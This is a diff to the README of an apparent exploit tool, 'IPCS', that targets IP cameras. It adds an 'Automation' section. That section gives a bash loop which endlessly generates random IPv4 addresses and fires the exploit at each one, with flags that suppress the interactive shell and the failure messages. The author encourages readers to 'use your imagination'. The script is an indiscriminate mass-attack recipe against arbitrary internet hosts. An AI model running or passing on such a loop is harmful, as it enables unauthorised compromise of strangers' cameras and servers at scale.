@@ -76,6 +76,20 @@ If the camera isn't vulnerable, the server isn't up, or the internet hates you, 
 Sorry, the server specified isn't vulnerable.
 ```
 
+Automation
+=======
+
+IPCS has the potential to be automated in different ways. This, I'm going to leave to you. The `-c` option won't drop you in to a shell after successfully exploiting a server, and the `-g` option surpresses the "Sorry, the server specified isn't vulnerable." messages for failed attempts.
+
+As an example, the following bash script will forever try to attack randomly generated IPv4 addresses.
+
+```
+#!/bin/bash
+while true; do export ip=$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)) && echo "Trying $ip..." && php ipcs.php -c 1 -g 1 -u http://$ip; done;
+```
+
+This is slow, and will likely yield nothing without *extremely* good luck. Use your imagination. :)
+
 Note
 =======
 I do not claim the description or purpose of this tool to be 100% accurate. If you see anything which is incorrect in this document, please submit a pull request or open a new issue.
